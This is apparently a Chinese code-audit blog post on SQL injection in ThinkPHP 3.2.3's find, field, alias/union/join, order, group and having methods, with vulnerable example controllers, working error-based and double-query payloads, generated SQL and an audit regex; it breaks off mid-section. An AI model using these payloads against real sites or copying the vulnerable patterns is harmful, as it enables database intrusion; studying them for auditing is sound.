<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span><span class="params">($options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($options) || is_string($options)) &#123;</span><br><span class="line">        $where[<span class="keyword">$this</span>-&gt;getPk()]  =   $options;</span><br><span class="line">        $options                =   <span class="keyword">array</span>();</span><br><span class="line">        $options[<span class="string">'where'</span>]       =   $where;</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="comment">// 根据复合主键查找记录</span></span><br><span class="line">    $pk  =  <span class="keyword">$this</span>-&gt;getPk();</span><br></pre></td></tr></table></figure>

<p>这里由于我们传入的$options为数组，所以绕过了第一个if判断</p>
<p>$pk的值是当前表的主键信息：</p>
<blockquote>
<p>若当前表仅有一个主键，则$pk的值为string</p>
<p>若当前表有多个主键，这$pk的值是以数组的形式存在</p>
<p>当$pk为string类型时，会导致接下来的部分判断绕过；否则payload不生效</p>
</blockquote>
<p>接下来的语句块是根据复合主键查询，因此处表为单主键，$pk为字符串类型，因此绕过判断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据复合主键查找记录</span></span><br><span class="line">$pk  =  <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line"><span class="keyword">if</span> (is_array($options) &amp;&amp; (count($options) &gt; <span class="number">0</span>) &amp;&amp; is_array($pk)) &#123;</span><br><span class="line">    <span class="comment">// 根据复合主键查询</span></span><br><span class="line">    $count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($options) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_int($key)) $count++; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> ($count == count($pk)) &#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($pk <span class="keyword">as</span> $field) &#123;</span><br><span class="line">            $where[$field] = $options[$i];</span><br><span class="line">            <span class="keyword">unset</span>($options[$i++]);</span><br><span class="line">        &#125;</span><br><span class="line">        $options[<span class="string">'where'</span>]  =  $where;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 总是查找一条记录</span></span><br><span class="line">$options[<span class="string">'limit'</span>]   =   <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 分析表达式</span></span><br><span class="line">$options            =   <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br><span class="line"><span class="comment">// 判断查询缓存</span></span><br></pre></td></tr></table></figure>

<p>接着进入到<code>_parseOptions($options)</code><br>这里的<code>$options</code>可控，同时在payload中<code>$options</code>仅存在table字段，不存在where字段，可顺利通过函数验证</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($options)) &#123;</span><br><span class="line">            $options = array_merge(<span class="keyword">$this</span>-&gt;options, $options);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * array_merge()将一个或多个数组合并成一个数组</span></span><br><span class="line"><span class="comment">             * 本处$this-&gt;options为空</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($options[<span class="string">'table'</span>])) &#123;<span class="comment">//option中无table下标时</span></span><br><span class="line">            <span class="comment">// 自动获取表名</span></span><br><span class="line">            $options[<span class="string">'table'</span>] = <span class="keyword">$this</span>-&gt;getTableName();<span class="comment">//$option中添加 'table'=&gt;'[表名]'</span></span><br><span class="line">            $fields           = <span class="keyword">$this</span>-&gt;fields;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span></span><br><span class="line">            $fields = <span class="keyword">$this</span>-&gt;getDbFields();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据表别名</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($options[<span class="string">'alias'</span>])) &#123;</span><br><span class="line">            $options[<span class="string">'table'</span>] .= <span class="string">' '</span> . $options[<span class="string">'alias'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 记录操作的模型名称</span></span><br><span class="line">        $options[<span class="string">'model'</span>] = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="comment">// 字段类型验证</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'where'</span>]) &amp;&amp; is_array($options[<span class="string">'where'</span>]) &amp;&amp; !<span class="keyword">empty</span>($fields) &amp;&amp; !<span class="keyword">isset</span>($options[<span class="string">'join'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">            <span class="keyword">foreach</span> ($options[<span class="string">'where'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                $key = trim($key);</span><br><span class="line">                <span class="keyword">if</span> (in_array($key, $fields, <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_scalar($val)) &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         * is_scalar($var)：检测变量是否是一个标量</span></span><br><span class="line"><span class="comment">                         * 标量变量是指那些包含了 integer、float、string 或 boolean的变量</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">                        <span class="keyword">$this</span>-&gt;_parseType($options[<span class="string">'where'</span>], $key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查询过后清空sql表达式组装 避免影响下次查询</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = <span class="keyword">array</span>();</span><br><span class="line">        <span class="comment">// 表达式过滤</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_options_filter($options);</span><br><span class="line">        <span class="keyword">return</span> $options;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后进入到<code>select()</code>方法中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$resultSet = <span class="keyword">$this</span>-&gt;db-&gt;select($options);</span><br><span class="line"><span class="comment">#select()方法体</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model = $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>]) ? $options[<span class="string">'bind'</span>] : <span class="keyword">array</span>());</span><br><span class="line">        $sql    = <span class="keyword">$this</span>-&gt;buildSelectSql($options);</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;query($sql, !<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>, !<span class="keyword">empty</span>($options[<span class="string">'master'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再进入到select方法体中<code>buildSelectSql()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'page'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 根据页数计算limit</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="keyword">$this</span>-&gt;parseSql(<span class="keyword">$this</span>-&gt;selectSql, $options);</span><br><span class="line">        <span class="keyword">return</span> $sql;<span class="comment">//SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入到<code>parseSql()</code>中，该方法主要用来利于前面获取的各字段信息，拼接SQL语句。</p>
<p>在此方法中，直接取出$options[‘table’]的值作为查询语句中的table</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span><span class="params">($sql, $options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sql = str_replace(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'%TABLE%'</span>, <span class="string">'%DISTINCT%'</span>, <span class="string">'%FIELD%'</span>, <span class="string">'%JOIN%'</span>, <span class="string">'%WHERE%'</span>, <span class="string">'%GROUP%'</span>, <span class="string">'%HAVING%'</span>, <span class="string">'%ORDER%'</span>, <span class="string">'%LIMIT%'</span>, <span class="string">'%UNION%'</span>, <span class="string">'%LOCK%'</span>, <span class="string">'%COMMENT%'</span>, <span class="string">'%FORCE%'</span>),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseDistinct(<span class="keyword">isset</span>($options[<span class="string">'distinct'</span>]) ? $options[<span class="string">'distinct'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseField(!<span class="keyword">empty</span>($options[<span class="string">'field'</span>]) ? $options[<span class="string">'field'</span>] : <span class="string">'*'</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseJoin(!<span class="keyword">empty</span>($options[<span class="string">'join'</span>]) ? $options[<span class="string">'join'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>]) ? $options[<span class="string">'where'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseGroup(!<span class="keyword">empty</span>($options[<span class="string">'group'</span>]) ? $options[<span class="string">'group'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseHaving(!<span class="keyword">empty</span>($options[<span class="string">'having'</span>]) ? $options[<span class="string">'having'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>]) ? $options[<span class="string">'order'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>]) ? $options[<span class="string">'limit'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseUnion(!<span class="keyword">empty</span>($options[<span class="string">'union'</span>]) ? $options[<span class="string">'union'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>]) ? $options[<span class="string">'lock'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>]) ? $options[<span class="string">'comment'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseForce(!<span class="keyword">empty</span>($options[<span class="string">'force'</span>]) ? $options[<span class="string">'force'</span>] : <span class="string">''</span>),</span><br><span class="line">            ), $sql);</span><br><span class="line">        <span class="keyword">return</span> $sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最终返回</p>
<blockquote>
<p>SELECT * FROM `thinkphp_user` WHERE ( 1=1 ) and updatexml(1,concat(0x7e,version(),0x7e),1)%23 LIMIT 1</p>
</blockquote>
<h3 id="field注入"><a href="#field注入" class="headerlink" title="field注入"></a>field注入</h3><p>field方法操作表中的字段，限制查询返回的结果<br>M(‘user’)-&gt;field(array(‘id,username’))-&gt;select();</p>
<p>只要field方法里的参数可控，不管是字符串还是数组，都可以进行注入。<br>M(‘user’)-&gt;field(array(‘id,username’=&gt;I(‘username’)))-&gt;select();</p>
<p><strong>指定字段</strong></p>
<p>在查询操作中field方法是使用最频繁的。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$Model-&gt;field('id,title,content')-&gt;select();</span><br></pre></td></tr></table></figure>

<p>这里使用field方法指定了查询的结果集中包含id,title,content三个字段的值。执行的SQL相当于：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,title,<span class="keyword">content</span> <span class="keyword">FROM</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>

<p>可以给某个字段设置别名，例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$Model-&gt;field('id,nickname as name')-&gt;select();</span><br></pre></td></tr></table></figure>

<p>执行的SQL语句相当于：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,nickname <span class="keyword">as</span> <span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>

<p><strong>使用SQL函数</strong></p>
<p>可以在field方法中直接使用函数，例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$Model-&gt;field('id,SUM(score)')-&gt;select();</span><br></pre></td></tr></table></figure>

<p>执行的SQL相当于：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">SUM</span>(score) <span class="keyword">FROM</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>

<p>当然，除了select方法之外，所有的查询方法，包括find等都可以使用field方法，这里只是以select为例说明。</p>
<p><strong>使用数组参数</strong></p>
<p>field方法的参数可以支持数组，例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$Model-&gt;field(array('id','title','content'))-&gt;select();</span><br></pre></td></tr></table></figure>

<p>最终执行的SQL和前面用字符串方式是等效的。</p>
<p>数组方式的定义可以为某些字段定义别名，例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$Model-&gt;field(array('id','nickname'=&gt;'name'))-&gt;select();</span><br></pre></td></tr></table></figure>

<p>执行的SQL相当于：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,nickname <span class="keyword">as</span> <span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>

<p><strong>实例</strong><br>在indexcontroller.class.php中添加一个field方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">field</span><span class="params">()</span></span>&#123;</span><br><span class="line">    M(<span class="string">'User'</span>)-&gt;field(<span class="keyword">array</span>(<span class="string">'id'</span>,<span class="string">'username'</span>=&gt;I(<span class="string">'name'</span>)))-&gt;select();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入name=uname时，SQL语句为<br><img src="/2020/05/05/ThinkPHP3.2.3/1588150608736.png" alt="1588150608736"></p>
<p>这里传入的name可控，所以可以进行注入<br>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?name=uname from thinkphp_user where 1=1 and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/ThinkPHP3.2.3/1588150756344.png" alt="1588150756344"></p>
<p>此时的SQL语句为</p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">`id`</span>,<span class="string">`username`</span> <span class="keyword">AS</span> uname <span class="keyword">from</span> thinkphp_user <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span><span class="string">` FROM `</span>thinkphp_user<span class="string">`</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="alias-union-join注入"><a href="#alias-union-join注入" class="headerlink" title="alias-union-join注入"></a>alias-union-join注入</h3><p><strong>ailas、join、union方法</strong><br>1.alias用于设置当前数据表的别名，便于使用其他的连贯操作例如join方法等，与field方法相似。</p>
<p>示例：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$Model = M('User');</span><br><span class="line">$Model-&gt;alias('a')-&gt;join('__DEPT__ b ON b.user_id= a.id')-&gt;select();</span><br></pre></td></tr></table></figure>

<p>最终生成的SQL语句类似于：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> think_user a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> think_dept b <span class="keyword">ON</span> b.user_id= a.id</span><br></pre></td></tr></table></figure>

<p>2.JOIN方法也是连贯操作方法之一，用于根据两个或多个表中的列之间的关系，从这些表中查询数据</p>
<p>join通常有下面几种类型，不同类型的join操作会影响返回的数据结果。</p>
<ul>
<li><strong>INNER JOIN</strong>: 如果表中有至少一个匹配，则返回行，等同于 JOIN</li>
<li><strong>LEFT JOIN</strong>: 即使右表中没有匹配，也从左表返回所有的行</li>
<li><strong>RIGHT JOIN</strong>: 即使左表中没有匹配，也从右表返回所有的行</li>
<li><strong>FULL JOIN</strong>: 只要其中一个表中存在匹配，就返回行</li>
</ul>
<p>join方法可以支持以上四种类型，例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$Model = M('Artist');</span><br><span class="line">$Model</span><br><span class="line">-&gt;join('think_work ON think_artist.id = think_work.artist_id')</span><br><span class="line">-&gt;join('think_card ON think_artist.card_id = think_card.id')</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure>

<p>3.UNION操作用于合并两个或多个 SELECT 语句的结果集。<br>使用示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$Model-&gt;field(<span class="string">'name'</span>)</span><br><span class="line">-&gt;table(<span class="string">'think_user_0'</span>)</span><br><span class="line">-&gt;union(<span class="string">'SELECT name FROM think_user_1'</span>)</span><br><span class="line">-&gt;union(<span class="string">'SELECT name FROM think_user_2'</span>)</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure>

<p>数组用法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$Model-&gt;field(<span class="string">'name'</span>)</span><br><span class="line">-&gt;table(<span class="string">'think_user_0'</span>)</span><br><span class="line">-&gt;union(<span class="keyword">array</span>(<span class="string">'field'</span>=&gt;<span class="string">'name'</span>,<span class="string">'table'</span>=&gt;<span class="string">'think_user_1'</span>))</span><br><span class="line">-&gt;union(<span class="keyword">array</span>(<span class="string">'field'</span>=&gt;<span class="string">'name'</span>,<span class="string">'table'</span>=&gt;<span class="string">'think_user_2'</span>))</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure>

<p><strong>实例</strong></p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">field</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="comment">//$Model = M('User');</span></span><br><span class="line"> $a=M(<span class="string">'user'</span>)-&gt;field(I(<span class="string">'id'</span>))-&gt;union(<span class="string">'select username from thinkphp_user'</span>)-&gt;select();</span><br><span class="line">     var_dump($a);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>当传入id=1时SQL语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">COLUMNS</span> <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">UNION</span> <span class="keyword">select</span> username <span class="keyword">from</span> thinkphp_user</span><br></pre></td></tr></table></figure>

<p>由于参数可控，所哟构造payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1 from thinkphp_user where 1=1 and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure>

<p>此时的SQL语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">from</span> thinkphp_user <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span><span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">UNION</span> <span class="keyword">select</span> username <span class="keyword">from</span> thinkphp_user</span><br></pre></td></tr></table></figure>

<p>从而造成注入<br><img src="/2020/05/05/ThinkPHP3.2.3/1588165126864.png" alt="1588165126864"></p>
<p>alias方法操作表的别名，和field方法类似，它一般和join方法成对出现，用于对数据的连贯操作。出现join和union方法的时候。只要能控制参数一般情况下都会产生注入。<br>代码审计时可以使用下面的正则查找</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">-&gt;(<span class="keyword">alias</span>|join|<span class="class"><span class="keyword">union</span>)\<span class="title">s</span>*\((\$|\$<span class="title">_</span>|<span class="title">I</span>)</span></span><br></pre></td></tr></table></figure>

<p>来进一步判断。</p>
<h3 id="order-group-having"><a href="#order-group-having" class="headerlink" title="order-group-having"></a>order-group-having</h3><p>1.order方法属于模型的连贯操作方法之一，用于对操作的结果排序。</p>
<p>用法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$Model-&gt;where(<span class="string">'status=1'</span>)-&gt;order(<span class="string">'id desc'</span>)-&gt;limit(<span class="number">5</span>)-&gt;select();</span><br></pre></td></tr></table></figure>

<p>注意：连贯操作方法没有顺序，可以在select方法调用之前随便改变调用顺序。<br>支持对多个字段的排序，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$Model-&gt;where(<span class="string">'status=1'</span>)-&gt;order(<span class="string">'id desc,status'</span>)-&gt;limit(<span class="number">5</span>)-&gt;select();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果没有指定desc或者asc排序规则的话，默认为asc。</p>
</blockquote>
<p>如果你的字段和mysql关键字有冲突，那么建议采用数组方式调用，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$Model-&gt;where(<span class="string">'status=1'</span>)-&gt;order(<span class="keyword">array</span>(<span class="string">'order'</span>,<span class="string">'id'</span>=&gt;<span class="string">'desc'</span>))-&gt;limit(<span class="number">5</span>)-&gt;select();</span><br></pre></td></tr></table></figure>

<p>2.GROUP方法也是连贯操作方法之一，通常用于结合合计函数，根据一个或多个列对结果集进行分组 。<br>group方法只有一个参数，并且只能使用字符串。<br>例如，我们都查询结果按照用户id进行分组统计：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;field(<span class="string">'user_id,username,max(score)'</span>)-&gt;group(<span class="string">'user_id'</span>)-&gt;select();</span><br></pre></td></tr></table></figure>

<p>生成的SQL语句是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SELECT user_id,username,max(score) FROM think_score GROUP BY user_id</span><br></pre></td></tr></table></figure>

<p>也支持对多个字段进行分组，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;field(<span class="string">'user_id,test_time,username,max(score)'</span>)-&gt;group(<span class="string">'user_id,test_time'</span>)-&gt;select();</span><br></pre></td></tr></table></figure>

<p>生成的SQL语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> user_id,test_time,username,<span class="keyword">max</span>(score) <span class="keyword">FROM</span> think_score <span class="keyword">GROUP</span> <span class="keyword">BY</span> user_id,test_time</span><br></pre></td></tr></table></figure>

<p>3.HAVING方法也是连贯操作之一，用于配合group方法完成从分组的结果中筛选（通常是聚合条件）数据。having方法只有一个参数，并且只能使用字符串，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;field(<span class="string">'username,max(score)'</span>)-&gt;group(<span class="string">'user_id'</span>)-&gt;having(<span class="string">'count(test_time)&gt;3'</span>)-&gt;select();</span><br></pre></td></tr></table></figure>

<p>生成的SQL语句是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SELECT username,max(score) FROM think_score GROUP BY user_id HAVING count(test_time)&gt;<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p><strong>实例order：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">M(<span class="string">'User'</span>)-&gt;where(<span class="string">'1=1'</span>)-&gt;order(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;I(<span class="string">'id'</span>)))-&gt;select();</span><br></pre></td></tr></table></figure>

<p>则构造如下语句,这里要使用双查询注入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>

<p>生成sql语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`thinkphp_user`</span> <span class="keyword">WHERE</span> ( <span class="number">1</span>=<span class="number">1</span> ) <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`id`</span> ,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/ThinkPHP3.2.3/1588214714395.png" alt="1588214714395"></p>
<p><strong>实例group</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data=M(<span class="string">'User'</span>)-&gt;field(<span class="string">'max(id),username'</span>)-&gt;group(I(<span class="string">'score'</span>))-&gt;select();  </span><br><span class="line">dump($data);</span><br></pre></td></tr></table></figure>

<p>注入方法与order方法一样，当group的参数可控时，便可进行注入<br>payload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?score=2,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>

<p><strong>实例having</strong></p>
<p>同上<br>当having的参数可控时，便可进行注入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data=M(<span class="string">'User'</span>)</span><br><span class="line">    -&gt;field(<span class="string">'max(id),username'</span>)</span><br><span class="line">    -&gt;group(I(<span class="string">'group'</span>))</span><br><span class="line">    -&gt;having(I(<span class="string">'having'</span>))</span><br><span class="line">    -&gt;select();</span><br><span class="line">    dump($data);</span><br></pre></td></tr></table></figure>

<p>传入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?group=id,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>

<p>最终sql</p>
